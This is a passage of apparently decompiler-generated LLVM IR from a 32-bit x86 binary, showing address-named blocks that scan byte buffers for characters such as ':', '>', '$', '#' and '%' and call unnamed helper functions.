  store i32 %v0_80510f5, i32* %eax.global-to-local, align 4
  store i32 %v0_80510f5, i32* @ebp, align 4
  %v10_80510ff = icmp eq i32 %v0_80510f5, -1
  %v1_8051102 = icmp eq i1 %v10_80510ff, false
  br i1 %v1_8051102, label %dec_label_pc_8051566, label %dec_label_pc_8050f72.loopexit12.loopexit

dec_label_pc_8051110:                             ; preds = %dec_label_pc_8050fe4
  %v1_8051110 = add i32 %v0_8050fe4, 24
  %v2_8051110 = inttoptr i32 %v1_8051110 to i32*
  %v3_8051110 = load i32, i32* %v2_8051110, align 4
  store i32 %v3_8051110, i32* %ecx.global-to-local, align 4
  %v1_8051113 = add i32 %v3_8051110, -1
  store i32 %v1_8051113, i32* %eax.global-to-local, align 4
  %tmp140 = icmp slt i32 %v1_8051113, 1
  br i1 %tmp140, label %dec_label_pc_8051145, label %dec_label_pc_805111a.preheader

dec_label_pc_805111a.preheader:                   ; preds = %dec_label_pc_8051110
  %v7_805111a.pre = load i32, i32* @edx, align 4
  %v2_805111a = add i32 %v0_8050fe4, 28
  br label %dec_label_pc_805111a

dec_label_pc_805111a:                             ; preds = %dec_label_pc_805111a.preheader, %dec_label_pc_8051142
  %v7_805111a = phi i32 [ %v7_805111a.pre, %dec_label_pc_805111a.preheader ], [ %v9_805111a, %dec_label_pc_8051142 ]
  %v0_80515ab = phi i32 [ %v1_8051113, %dec_label_pc_805111a.preheader ], [ %v1_8051142, %dec_label_pc_8051142 ]
  %v3_805111a = add i32 %v2_805111a, %v0_80515ab
  %v4_805111a = inttoptr i32 %v3_805111a to i8*
  %v5_805111a = load i8, i8* %v4_805111a, align 1
  %v6_805111a = zext i8 %v5_805111a to i32
  %v8_805111a = and i32 %v7_805111a, -256
  %v9_805111a = or i32 %v6_805111a, %v8_805111a
  store i32 %v9_805111a, i32* %edx.global-to-local, align 4
  %v10_805111e = icmp eq i8 %v5_805111a, 58
  br i1 %v10_805111e, label %dec_label_pc_80515ab, label %dec_label_pc_8051127

dec_label_pc_8051127:                             ; preds = %dec_label_pc_805111a
  %v10_8051127 = icmp eq i8 %v5_805111a, 62
  br i1 %v10_8051127, label %dec_label_pc_80515ab, label %dec_label_pc_8051130

dec_label_pc_8051130:                             ; preds = %dec_label_pc_8051127
  %v10_8051130 = icmp eq i8 %v5_805111a, 36
  br i1 %v10_8051130, label %dec_label_pc_80515ab, label %dec_label_pc_8051139

dec_label_pc_8051139:                             ; preds = %dec_label_pc_8051130
  %v10_8051139 = icmp eq i8 %v5_805111a, 35
  br i1 %v10_8051139, label %dec_label_pc_80515ab, label %dec_label_pc_8051142

dec_label_pc_8051142:                             ; preds = %dec_label_pc_8051139
  %v1_8051142 = add i32 %v0_80515ab, -1
  %v8_8051142 = icmp eq i32 %v1_8051142, 0
  store i32 %v1_8051142, i32* %eax.global-to-local, align 4
  %v1_8051143 = icmp eq i1 %v8_8051142, false
  br i1 %v1_8051143, label %dec_label_pc_805111a, label %dec_label_pc_8051145

dec_label_pc_8051145:                             ; preds = %dec_label_pc_8051142, %dec_label_pc_80515ab, %dec_label_pc_8051110
  %v0_8051145 = load i32, i32* @esp, align 4
  %v1_8051145 = add i32 %v0_8051145, -4
  %v2_8051145 = inttoptr i32 %v1_8051145 to i32*
  store i32 7, i32* %v2_8051145, align 4
  %v1_8051147 = add i32 %v0_8051145, -8
  %v2_8051147 = inttoptr i32 %v1_8051147 to i32*
  store i32 ptrtoint ([8 x i8]* @global_var_80556b0.48 to i32), i32* %v2_8051147, align 4
  %v0_805114c = load i32, i32* %ecx.global-to-local, align 4
  %v2_805114c = add i32 %v0_8051145, -12
  %v3_805114c = inttoptr i32 %v2_805114c to i32*
  store i32 %v0_805114c, i32* %v3_805114c, align 4
  %v1_805114d = add i32 %v0_8051145, 16
  %v2_805114d = inttoptr i32 %v1_805114d to i32*
  %v3_805114d = load i32, i32* %v2_805114d, align 4
  %v2_8051151 = add i32 %v0_8051145, -16
  %v3_8051151 = inttoptr i32 %v2_8051151 to i32*
  store i32 %v3_805114d, i32* %v3_8051151, align 4
  %v0_8051152 = call i32 @function_8052690()
  store i32 %v0_8051152, i32* %eax.global-to-local, align 4
  store i32 %v0_8051152, i32* @ebp, align 4
  %v10_805115c = icmp eq i32 %v0_8051152, -1
  %v1_805115f = icmp eq i1 %v10_805115c, false
  br i1 %v1_805115f, label %dec_label_pc_80515b7, label %dec_label_pc_8050f72.loopexit12.loopexit

dec_label_pc_8051170:                             ; preds = %dec_label_pc_8050fe4
  %v1_8051170 = add i32 %v0_8050fe4, 24
  %v2_8051170 = inttoptr i32 %v1_8051170 to i32*
  %v3_8051170 = load i32, i32* %v2_8051170, align 4
  %v1_8051173 = add i32 %v3_8051170, -1
  store i32 %v1_8051173, i32* %eax.global-to-local, align 4
  %tmp141 = icmp slt i32 %v1_8051173, 1
  br i1 %tmp141, label %dec_label_pc_8050f72.loopexit12.loopexit, label %dec_label_pc_805117c.preheader

dec_label_pc_805117c.preheader:                   ; preds = %dec_label_pc_8051170
  %v7_805117c.pre = load i32, i32* @edx, align 4
  %v2_805117c = add i32 %v0_8050fe4, 28
  br label %dec_label_pc_805117c

dec_label_pc_805117c:                             ; preds = %dec_label_pc_805117c.preheader, %dec_label_pc_80511ad
  %v7_805117c = phi i32 [ %v7_805117c.pre, %dec_label_pc_805117c.preheader ], [ %v9_805117c, %dec_label_pc_80511ad ]
  %v0_80516ef = phi i32 [ %v1_8051173, %dec_label_pc_805117c.preheader ], [ %v1_80511ad, %dec_label_pc_80511ad ]
  %v3_805117c = add i32 %v2_805117c, %v0_80516ef
  %v4_805117c = inttoptr i32 %v3_805117c to i8*
  %v5_805117c = load i8, i8* %v4_805117c, align 1
  %v6_805117c = zext i8 %v5_805117c to i32
  %v8_805117c = and i32 %v7_805117c, -256
  %v9_805117c = or i32 %v6_805117c, %v8_805117c
  store i32 %v9_805117c, i32* %edx.global-to-local, align 4
  %v10_8051180 = icmp eq i8 %v5_805117c, 58
  br i1 %v10_8051180, label %dec_label_pc_80516ef, label %dec_label_pc_8051189

dec_label_pc_8051189:                             ; preds = %dec_label_pc_805117c
  %v10_8051189 = icmp eq i8 %v5_805117c, 62
  br i1 %v10_8051189, label %dec_label_pc_80516ef, label %dec_label_pc_8051192

dec_label_pc_8051192:                             ; preds = %dec_label_pc_8051189
  %v10_8051192 = icmp eq i8 %v5_805117c, 36
  br i1 %v10_8051192, label %dec_label_pc_80516ef, label %dec_label_pc_805119b

dec_label_pc_805119b:                             ; preds = %dec_label_pc_8051192
  %v10_805119b = icmp eq i8 %v5_805117c, 35
  br i1 %v10_805119b, label %dec_label_pc_80516ef, label %dec_label_pc_80511a4

dec_label_pc_80511a4:                             ; preds = %dec_label_pc_805119b
  %v10_80511a4 = icmp eq i8 %v5_805117c, 37
  br i1 %v10_80511a4, label %dec_label_pc_80516ef, label %dec_label_pc_80511ad

dec_label_pc_80511ad:                             ; preds = %dec_label_pc_80511a4
  %v1_80511ad = add i32 %v0_80516ef, -1
  %v8_80511ad = icmp eq i32 %v1_80511ad, 0
  store i32 %v1_80511ad, i32* %eax.global-to-local, align 4
  %v1_80511ae = icmp eq i1 %v8_80511ad, false
  br i1 %v1_80511ae, label %dec_label_pc_805117c, label %dec_label_pc_8050f72.backedge

dec_label_pc_80511b5:                             ; preds = %dec_label_pc_8050fe4
  %v1_80511b5 = add i32 %v0_8050fe4, 24
  %v2_80511b5 = inttoptr i32 %v1_80511b5 to i32*
  %v3_80511b5 = load i32, i32* %v2_80511b5, align 4
  %v1_80511b8 = add i32 %v3_80511b5, -1
  store i32 %v1_80511b8, i32* %eax.global-to-local, align 4
  %tmp142 = icmp slt i32 %v1_80511b8, 1
  br i1 %tmp142, label %dec_label_pc_8050f72.loopexit12.loopexit, label %dec_label_pc_80511c1.preheader

dec_label_pc_80511c1.preheader:                   ; preds = %dec_label_pc_80511b5
  %v7_80511c1.pre = load i32, i32* @edx, align 4
  %v2_80511c1 = add i32 %v0_8050fe4, 28
  br label %dec_label_pc_80511c1

dec_label_pc_80511c1:                             ; preds = %dec_label_pc_80511c1.preheader, %dec_label_pc_80511f2
  %v7_80511c1 = phi i32 [ %v7_80511c1.pre, %dec_label_pc_80511c1.preheader ], [ %v9_80511c1, %dec_label_pc_80511f2 ]
  %v0_80515fd = phi i32 [ %v1_80511b8, %dec_label_pc_80511c1.preheader ], [ %v1_80511f2, %dec_label_pc_80511f2 ]
  %v3_80511c1 = add i32 %v2_80511c1, %v0_80515fd
  %v4_80511c1 = inttoptr i32 %v3_80511c1 to i8*
  %v5_80511c1 = load i8, i8* %v4_80511c1, align 1
  %v6_80511c1 = zext i8 %v5_80511c1 to i32
  %v8_80511c1 = and i32 %v7_80511c1, -256
  %v9_80511c1 = or i32 %v6_80511c1, %v8_80511c1
  store i32 %v9_80511c1, i32* %edx.global-to-local, align 4
  %v10_80511c5 = icmp eq i8 %v5_80511c1, 58
  br i1 %v10_80511c5, label %dec_label_pc_80515fd, label %dec_label_pc_80511ce

dec_label_pc_80511ce:                             ; preds = %dec_label_pc_80511c1
  %v10_80511ce = icmp eq i8 %v5_80511c1, 62
  br i1 %v10_80511ce, label %dec_label_pc_80515fd, label %dec_label_pc_80511d7

dec_label_pc_80511d7:                             ; preds = %dec_label_pc_80511ce
  %v10_80511d7 = icmp eq i8 %v5_80511c1, 36
  br i1 %v10_80511d7, label %dec_label_pc_80515fd, label %dec_label_pc_80511e0

dec_label_pc_80511e0:                             ; preds = %dec_label_pc_80511d7
  %v10_80511e0 = icmp eq i8 %v5_80511c1, 35
  br i1 %v10_80511e0, label %dec_label_pc_80515fd, label %dec_label_pc_80511e9

dec_label_pc_80511e9:                             ; preds = %dec_label_pc_80511e0
  %v10_80511e9 = icmp eq i8 %v5_80511c1, 37
  br i1 %v10_80511e9, label %dec_label_pc_80515fd, label %dec_label_pc_80511f2

dec_label_pc_80511f2:                             ; preds = %dec_label_pc_80511e9
  %v1_80511f2 = add i32 %v0_80515fd, -1
  %v8_80511f2 = icmp eq i32 %v1_80511f2, 0
  store i32 %v1_80511f2, i32* %eax.global-to-local, align 4
  %v1_80511f3 = icmp eq i1 %v8_80511f2, false
  br i1 %v1_80511f3, label %dec_label_pc_80511c1, label %dec_label_pc_8050f72.backedge

dec_label_pc_8051200:                             ; preds = %dec_label_pc_8050fe4
  %v0_8051200 = load i32, i32* @esp, align 4
  %v1_8051203 = add i32 %v0_8051200, -16
  %v2_8051203 = inttoptr i32 %v1_8051203 to i32*
  store i32 26, i32* %v2_8051203, align 4
  %v2_8051205 = call i32 @function_8051c90(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8051205, i32* %eax.global-to-local, align 4
  %v0_805120a = load i32, i32* @esp, align 4
  %v1_805120a = inttoptr i32 %v0_805120a to i32*
  %v2_805120a = load i32, i32* %v1_805120a, align 4
  store i32 %v2_805120a, i32* %eax.global-to-local, align 4
  %v3_805120a = add i32 %v0_805120a, 4
  %v1_805120b = inttoptr i32 %v3_805120a to i32*
  %v2_805120b = load i32, i32* %v1_805120b, align 4
  store i32 %v2_805120b, i32* %edx.global-to-local, align 4
  %v1_805120c = add i32 %v0_805120a, 1880
  store i32 %v1_805120c, i32* %ecx.global-to-local, align 4
  store i32 %v1_805120c, i32* %v1_805120b, align 4
  store i32 26, i32* %v1_805120a, align 4
  %v3_8051216 = call i32 @function_8051be0(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_8051216, i32* %eax.global-to-local, align 4
  %v0_805121b = load i32, i32* @esp, align 4
  %v1_805121b = add i32 %v0_805121b, 1880
  %v2_805121b = inttoptr i32 %v1_805121b to i32*
  %v3_805121b = load i32, i32* %v2_805121b, align 4
  %v1_8051222 = add i32 %v3_805121b, -1
  store i32 %v1_8051222, i32* %edx.global-to-local, align 4
  %v2_8051223 = add i32 %v0_805121b, -4
  %v3_8051223 = inttoptr i32 %v2_8051223 to i32*
  store i32 %v1_8051222, i32* %v3_8051223, align 4
  %v2_8051224 = add i32 %v0_805121b, -8
  %v3_8051224 = inttoptr i32 %v2_8051224 to i32*
  store i32 %v3_8051216, i32* %v3_8051224, align 4
  %v0_8051225 = load i32, i32* @edi, align 4
  %v1_8051225 = add i32 %v0_8051225, 24
  %v2_8051225 = inttoptr i32 %v1_8051225 to i32*
  %v3_8051225 = load i32, i32* %v2_8051225, align 4
  store i32 %v3_8051225, i32* %eax.global-to-local, align 4
  %v2_8051228 = add i32 %v0_805121b, -12
  %v3_8051228 = inttoptr i32 %v2_8051228 to i32*
  store i32 %v3_8051225, i32* %v3_8051228, align 4
  %v1_8051229 = add i32 %v0_805121b, 32
  %v2_8051229 = inttoptr i32 %v1_8051229 to i32*
  %v3_8051229 = load i32, i32* %v2_8051229, align 4
  store i32 %v3_8051229, i32* %eax.global-to-local, align 4
  %v2_805122d = add i32 %v0_805121b, -16
  %v3_805122d = inttoptr i32 %v2_805122d to i32*
  store i32 %v3_8051229, i32* %v3_805122d, align 4
  %v0_805122e = call i32 @function_8052690()
  %v0_8051233 = load i32, i32* @esp, align 4
  %v1_8051236 = add i32 %v0_805122e, 1
  %v8_8051236 = icmp eq i32 %v1_8051236, 0
  store i32 %v1_8051236, i32* %eax.global-to-local, align 4
  %v1_8051237 = icmp eq i1 %v8_8051236, false
  %v1_80517e4 = add i32 %v0_8051233, 16
  %v2_80517e4 = inttoptr i32 %v1_80517e4 to i32*
  store i32 26, i32* %v2_80517e4, align 4
  %v2_80517e6 = call i32 @function_8051c10(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_80517e6, i32* %eax.global-to-local, align 4
  %v0_80517eb = load i32, i32* @esp, align 4
  %v1_80517eb = inttoptr i32 %v0_80517eb to i32*
  br i1 %v1_8051237, label %dec_label_pc_80517e1, label %dec_label_pc_805123d

dec_label_pc_805123d:                             ; preds = %dec_label_pc_8051200
  store i32 25, i32* %v1_80517eb, align 4
  %v2_805124e = call i32 @function_8051c90(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_805124e, i32* %eax.global-to-local, align 4
  %v0_8051253 = load i32, i32* @esp, align 4
  %v1_8051253 = inttoptr i32 %v0_8051253 to i32*
  %v3_8051253 = add i32 %v0_8051253, 4
  %v1_8051254 = inttoptr i32 %v3_8051253 to i32*
  %v1_8051255 = add i32 %v0_8051253, 1880
  store i32 %v1_8051255, i32* %eax.global-to-local, align 4
  store i32 %v1_8051255, i32* %v1_8051254, align 4
  store i32 25, i32* %v1_8051253, align 4
  %v3_805125f = call i32 @function_8051be0(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
  store i32 %v3_805125f, i32* %eax.global-to-local, align 4
  %v0_8051264 = load i32, i32* @esp, align 4
  %v1_8051264 = add i32 %v0_8051264, 1880
  %v2_8051264 = inttoptr i32 %v1_8051264 to i32*
  %v3_8051264 = load i32, i32* %v2_8051264, align 4
  %v1_805126b = add i32 %v3_8051264, -1
  store i32 %v1_805126b, i32* %edx.global-to-local, align 4
  %v2_805126c = add i32 %v0_8051264, -4
  %v3_805126c = inttoptr i32 %v2_805126c to i32*
  store i32 %v1_805126b, i32* %v3_805126c, align 4
  %v2_805126d = add i32 %v0_8051264, -8
  %v3_805126d = inttoptr i32 %v2_805126d to i32*
  store i32 %v3_805125f, i32* %v3_805126d, align 4
  %v0_805126e = load i32, i32* @edi, align 4
  %v1_805126e = add i32 %v0_805126e, 24
  %v2_805126e = inttoptr i32 %v1_805126e to i32*
  %v3_805126e = load i32, i32* %v2_805126e, align 4
  store i32 %v3_805126e, i32* @esi, align 4
  %v2_8051271 = add i32 %v0_8051264, -12
  %v3_8051271 = inttoptr i32 %v2_8051271 to i32*
  store i32 %v3_805126e, i32* %v3_8051271, align 4
  %v1_8051272 = add i32 %v0_8051264, 32
  %v2_8051272 = inttoptr i32 %v1_8051272 to i32*
  %v3_8051272 = load i32, i32* %v2_8051272, align 4
  store i32 %v3_8051272, i32* @ebx, align 4
  %v2_8051276 = add i32 %v0_8051264, -16
  %v3_8051276 = inttoptr i32 %v2_8051276 to i32*
  store i32 %v3_8051272, i32* %v3_8051276, align 4
  %v0_8051277 = call i32 @function_8052690()
  store i32 %v0_8051277, i32* %eax.global-to-local, align 4
  %v0_805127c = load i32, i32* @esp, align 4
  store i32 %v0_8051277, i32* @ebp, align 4
  %v1_8051281 = add i32 %v0_805127c, 16
  %v2_8051281 = inttoptr i32 %v1_8051281 to i32*
  store i32 25, i32* %v2_8051281, align 4
  %v2_8051283 = call i32 @function_8051c10(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8051283, i32* %eax.global-to-local, align 4
  %v0_8051288 = load i32, i32* @esp, align 4
  %v0_805128b = load i32, i32* @ebp, align 4
  %v10_805128b = icmp eq i32 %v0_805128b, -1
  br i1 %v10_805128b, label %dec_label_pc_8050f72.loopexit12.loopexit, label %dec_label_pc_8051294

dec_label_pc_8051294:                             ; preds = %dec_label_pc_805123d
  %tmp143 = icmp slt i32 %v0_805128b, 1
  br i1 %tmp143, label %dec_label_pc_8051413, label %dec_label_pc_805129c

dec_label_pc_805129c:                             ; preds = %dec_label_pc_8051294
  %v0_805129c = load i32, i32* @edi, align 4
  %v1_805129c = inttoptr i32 %v0_805129c to i32*
  %v2_805129c = load i32, i32* %v1_805129c, align 4
  store i32 %v2_805129c, i32* %edx.global-to-local, align 4
  %v1_805129e = add i32 %v0_805129c, 16
  %v2_805129e = inttoptr i32 %v1_805129e to i32*
  %v3_805129e = load i32, i32* %v2_805129e, align 4
  store i32 %v3_805129e, i32* %eax.global-to-local, align 4
  %v2_80512a1 = add i32 %v0_8051288, 52
  %v3_80512a1 = inttoptr i32 %v2_80512a1 to i32*
  store i32 %v2_805129c, i32* %v3_80512a1, align 4
  %v0_80512a5 = load i32, i32* @edi, align 4
  %v1_80512a5 = add i32 %v0_80512a5, 20
  %v2_80512a5 = inttoptr i32 %v1_80512a5 to i32*
  %v3_80512a5 = load i32, i32* %v2_80512a5, align 4
  store i32 %v3_80512a5, i32* %edx.global-to-local, align 4
  %v0_80512a8 = load i32, i32* %eax.global-to-local, align 4
  %v1_80512a8 = load i32, i32* @esp, align 4
  %v2_80512a8 = add i32 %v1_80512a8, 1872
  %v3_80512a8 = inttoptr i32 %v2_80512a8 to i32*
  store i32 %v0_80512a8, i32* %v3_80512a8, align 4
  %v0_80512af = load i32, i32* %edx.global-to-local, align 4
  %v1_80512af = trunc i32 %v0_80512af to i16
  %v2_80512af = load i32, i32* @esp, align 4
  %v3_80512af = add i32 %v2_80512af, 1882
  %v4_80512af = inttoptr i32 %v3_80512af to i16*
  store i16 %v1_80512af, i16* %v4_80512af, align 2
  %v0_80512b7 = call i32 @function_8052baf()
  store i32 %v0_80512b7, i32* %eax.global-to-local, align 4
  %tmp144 = icmp slt i32 %v0_80512b7, 1
  br i1 %tmp144, label %dec_label_pc_8051a1e, label %dec_label_pc_80512c4

dec_label_pc_80512c4:                             ; preds = %dec_label_pc_8051a3f, %dec_label_pc_8051a1e, %dec_label_pc_805129c
  %v0_80512c4 = load i32, i32* @esp, align 4
  %v0_80512c7 = load i32, i32* @edi, align 4
  %v1_80512c7 = add i32 %v0_80512c7, 4
  %v2_80512c7 = inttoptr i32 %v1_80512c7 to i32*
  %v3_80512c7 = load i32, i32* %v2_80512c7, align 4
  store i32 %v3_80512c7, i32* @esi, align 4
  %v2_80512ca = add i32 %v0_80512c4, -16
  %v3_80512ca = inttoptr i32 %v2_80512ca to i32*
  store i32 %v3_80512c7, i32* %v3_80512ca, align 4
  %v1_80512cb = call i32 @function_8052b81(i32 ptrtoint (i32* @0 to i32))
  store i32 %v1_80512cb, i32* %eax.global-to-local, align 4
  %v0_80512d0 = load i32, i32* @edi, align 4
  %v1_80512d0 = add i32 %v0_80512d0, 4
  %v2_80512d0 = inttoptr i32 %v1_80512d0 to i32*
  store i32 -1, i32* %v2_80512d0, align 4
  %v0_80512d7 = load i32, i32* @edi, align 4
  %v1_80512d7 = add i32 %v0_80512d7, 12
  %v2_80512d7 = inttoptr i32 %v1_80512d7 to i32*
  store i32 0, i32* %v2_80512d7, align 4
  br label %dec_label_pc_80512e1

dec_label_pc_80512e1:                             ; preds = %dec_label_pc_8051413, %dec_label_pc_805168a, %dec_label_pc_805135e, %dec_label_pc_80519a0, %dec_label_pc_8051814, %dec_label_pc_8051611, %dec_label_pc_8051703, %dec_label_pc_80515bf, %dec_label_pc_805156e, %dec_label_pc_805107b, %dec_label_pc_805177c, %dec_label_pc_80512c4
  %v0_80512e1 = load i32, i32* @edi, align 4
  %v1_80512e1 = add i32 %v0_80512e1, 24
  %v2_80512e1 = inttoptr i32 %v1_80512e1 to i32*
  %v3_80512e1 = load i32, i32* %v2_80512e1, align 4
  store i32 %v3_80512e1, i32* @edx, align 4
  store i32 %v3_80512e1, i32* %eax.global-to-local, align 4
  %v1_80512e6 = load i32, i32* @ebp, align 4
  %v2_80512e6 = sub i32 %v3_80512e1, %v1_80512e6
  %v8_80512e6 = xor i32 %v1_80512e6, %v3_80512e1
  %v9_80512e6 = xor i32 %v2_80512e6, %v3_80512e1
  %v10_80512e6 = and i32 %v9_80512e6, %v8_80512e6
  %v11_80512e6 = icmp slt i32 %v10_80512e6, 0
  %v12_80512e6 = icmp eq i32 %v2_80512e6, 0
  %v13_80512e6 = icmp slt i32 %v2_80512e6, 0
  %v3_80512e8 = icmp ne i1 %v13_80512e6, %v11_80512e6
  %v4_80512e8 = or i1 %v12_80512e6, %v3_80512e8
  br i1 %v4_80512e8, label %dec_label_pc_80512ec, label %dec_label_pc_80512ea

dec_label_pc_80512ea:                             ; preds = %dec_label_pc_80512e1
  store i32 %v1_80512e6, i32* @edx, align 4
  br label %dec_label_pc_80512ec

dec_label_pc_80512ec:                             ; preds = %dec_label_pc_80512e1, %dec_label_pc_80512ea
  %v1_80512ec = phi i32 [ %v3_80512e1, %dec_label_pc_80512e1 ], [ %v1_80512e6, %dec_label_pc_80512ea ]
  %v2_80512ec = sub i32 %v3_80512e1, %v1_80512ec
  store i32 %v2_80512ec, i32* %eax.global-to-local, align 4
  store i32 %v2_80512ec, i32* %v2_80512e1, align 4
  %v0_80512f1 = load i32, i32* @ebx, align 4
  %v1_80512f1 = load i32, i32* @esp, align 4
  %v2_80512f1 = add i32 %v1_80512f1, -4
  %v3_80512f1 = inttoptr i32 %v2_80512f1 to i32*
  store i32 %v0_80512f1, i32* %v3_80512f1, align 4
  %v0_80512f2 = load i32, i32* %eax.global-to-local, align 4
  %v2_80512f2 = add i32 %v1_80512f1, -8
  %v3_80512f2 = inttoptr i32 %v2_80512f2 to i32*
  store i32 %v0_80512f2, i32* %v3_80512f2, align 4
  %v1_80512f3 = add i32 %v1_80512f1, 16
  %v2_80512f3 = inttoptr i32 %v1_80512f3 to i32*
  %v3_80512f3 = load i32, i32* %v2_80512f3, align 4
  %v1_80512f7 = load i32, i32* @edx, align 4
  %v2_80512f7 = add i32 %v1_80512f7, %v3_80512f3
  store i32 %v2_80512f7, i32* %eax.global-to-local, align 4
  %v2_80512f9 = add i32 %v1_80512f1, -12
  %v3_80512f9 = inttoptr i32 %v2_80512f9 to i32*
  store i32 %v2_80512f7, i32* %v3_80512f9, align 4
  %v3_80512fa = load i32, i32* %v2_80512f3, align 4
  store i32 %v3_80512fa, i32* %ecx.global-to-local, align 4
  %v2_80512fe = add i32 %v1_80512f1, -16
  %v3_80512fe = inttoptr i32 %v2_80512fe to i32*
  store i32 %v3_80512fa, i32* %v3_80512fe, align 4
  %v4_80512ff = call i32 @function_80530e3(i8* bitcast (i32* @0 to i8*), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80512ff, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050fe4

dec_label_pc_805130c:                             ; preds = %dec_label_pc_8050fe4
  %v1_805130c = add i32 %v0_8050fe4, 24
  %v2_805130c = inttoptr i32 %v1_805130c to i32*
  %v3_805130c = load i32, i32* %v2_805130c, align 4
  %v1_805130f = add i32 %v3_805130c, -1
  store i32 %v1_805130f, i32* %eax.global-to-local, align 4
  %tmp145 = icmp slt i32 %v1_805130f, 1
  br i1 %tmp145, label %dec_label_pc_8050f72.loopexit12.loopexit, label %dec_label_pc_8051318

dec_label_pc_8051318:                             ; preds = %dec_label_pc_805130c
  %v2_8051318 = add i32 %v0_8050fe4, 27
  %v3_8051318 = add i32 %v2_8051318, %v3_805130c
  %v4_8051318 = inttoptr i32 %v3_8051318 to i8*
  %v5_8051318 = load i8, i8* %v4_8051318, align 1
  %v6_8051318 = zext i8 %v5_8051318 to i32
  %v7_8051318 = load i32, i32* @edx, align 4
  %v8_8051318 = and i32 %v7_8051318, -256
  %v9_8051318 = or i32 %v8_8051318, %v6_8051318
  store i32 %v9_8051318, i32* %edx.global-to-local, align 4
  %v10_805131c = icmp eq i8 %v5_8051318, 62
  br i1 %v10_805131c, label %dec_label_pc_805134a.thread, label %dec_label_pc_8051321

dec_label_pc_8051321:                             ; preds = %dec_label_pc_8051318
  %v10_8051321 = icmp eq i8 %v5_8051318, 58
  br i1 %v10_8051321, label %dec_label_pc_805134a.thread, label %dec_label_pc_8051326

dec_label_pc_8051326:                             ; preds = %dec_label_pc_8051321, %dec_label_pc_8051345
  %v0_8051335 = phi i32 [ %v1_8051335, %dec_label_pc_8051345 ], [ %v1_805130f, %dec_label_pc_8051321 ]
  %v7_805133c = phi i32 [ %v9_805133c, %dec_label_pc_8051345 ], [ %v9_8051318, %dec_label_pc_8051321 ]
  %v1_8051326 = trunc i32 %v7_805133c to i8
  %v10_8051326 = icmp eq i8 %v1_8051326, 36
  br i1 %v10_8051326, label %dec_label_pc_805134a, label %dec_label_pc_805132b

dec_label_pc_805132b:                             ; preds = %dec_label_pc_8051326
  %v10_805132b = icmp eq i8 %v1_8051326, 35
  br i1 %v10_805132b, label %dec_label_pc_805134a, label %dec_label_pc_8051330

dec_label_pc_8051330:                             ; preds = %dec_label_pc_805132b
  %v10_8051330 = icmp eq i8 %v1_8051326, 37
  br i1 %v10_8051330, label %dec_label_pc_805134a, label %dec_label_pc_8051335

dec_label_pc_8051335:                             ; preds = %dec_label_pc_8051330
  %v1_8051335 = add i32 %v0_8051335, -1
  %v8_8051335 = icmp eq i32 %v1_8051335, 0
  store i32 %v1_8051335, i32* %eax.global-to-local, align 4
  br i1 %v8_8051335, label %dec_label_pc_8050f72.backedge, label %dec_label_pc_805133c

dec_label_pc_805133c:                             ; preds = %dec_label_pc_8051335
  %v3_805133c = add i32 %v2_8051318, %v0_8051335
  %v4_805133c = inttoptr i32 %v3_805133c to i8*
  %v5_805133c = load i8, i8* %v4_805133c, align 1
  %v6_805133c = zext i8 %v5_805133c to i32
  %v8_805133c = and i32 %v7_805133c, -256
  %v9_805133c = or i32 %v6_805133c, %v8_805133c
  store i32 %v9_805133c, i32* %edx.global-to-local, align 4
  %v10_8051340 = icmp eq i8 %v5_805133c, 58
  br i1 %v10_8051340, label %dec_label_pc_805134a, label %dec_label_pc_8051345

dec_label_pc_8051345:                             ; preds = %dec_label_pc_805133c
  %v10_8051345 = icmp eq i8 %v5_805133c, 62
  %v1_8051348 = icmp eq i1 %v10_8051345, false
  br i1 %v1_8051348, label %dec_label_pc_8051326, label %dec_label_pc_805134a

dec_label_pc_805134a.thread:                      ; preds = %dec_label_pc_8051321, %dec_label_pc_8051318
  store i32 %v3_805130c, i32* @ebp, align 4
  br label %dec_label_pc_8051356

dec_label_pc_805134a:                             ; preds = %dec_label_pc_8051345, %dec_label_pc_805133c, %dec_label_pc_8051330, %dec_label_pc_805132b, %dec_label_pc_8051326
  %v0_805134a = phi i32 [ %v0_8051335, %dec_label_pc_8051326 ], [ %v0_8051335, %dec_label_pc_805132b ], [ %v0_8051335, %dec_label_pc_8051330 ], [ %v1_8051335, %dec_label_pc_805133c ], [ %v1_8051335, %dec_label_pc_8051345 ]
  %v1_805134a = add i32 %v0_805134a, 1
  store i32 %v1_805134a, i32* @ebp, align 4
  %v10_805134d = icmp eq i32 %v0_805134a, -2
  br i1 %v10_805134d, label %dec_label_pc_8050f72.loopexit12.loopexit, label %dec_label_pc_8051356

dec_label_pc_8051356:                             ; preds = %dec_label_pc_805134a.thread, %dec_label_pc_805134a
  %v1_805134a160 = phi i32 [ %v3_805130c, %dec_label_pc_805134a.thread ], [ %v1_805134a, %dec_label_pc_805134a ]
  %tmp146 = icmp slt i32 %v1_805134a160, 1
  br i1 %tmp146, label %dec_label_pc_8051413, label %dec_label_pc_805135e

dec_label_pc_805135e:                             ; preds = %dec_label_pc_8051356
  %v0_805135e = load i32, i32* @esp, align 4
  %v1_8051361 = add i32 %v0_805135e, -16
  %v2_8051361 = inttoptr i32 %v1_8051361 to i32*
  store i32 20, i32* %v2_8051361, align 4
  %v2_8051363 = call i32 @function_8051c90(i8 ptrtoint (i32* @0 to i8))
  store i32 %v2_8051363, i32* %eax.global-to-local, align 4
  %v0_8051368 = load i32, i32* @esp, align 4
  %v1_8051368 = inttoptr i32 %v0_8051368 to i32*
  %v2_8051368 = load i32, i32* %v1_8051368, align 4
  store i32 %v2_8051368, i32* %eax.global-to-local, align 4
  %v3_8051368 = add i32 %v0_8051368, 4
  %v1_8051369 = inttoptr i32 %v3_8051368 to i32*
  %v2_8051369 = load i32, i32* %v1_8051369, align 4
  store i32 %v2_8051369, i32* %edx.global-to-local, align 4
  %v1_805136a = add i32 %v0_8051368, 1888
  store i32 %v1_805136a, i32* %eax.global-to-local, align 4
  store i32 %v1_805136a, i32* %v1_8051369, align 4
  store i32 20, i32* %v1_8051368, align 4
  %v3_8051374 = call i32 @function_8051be0(i32 ptrtoint (i32* @0 to i32), i32* nonnull @0)
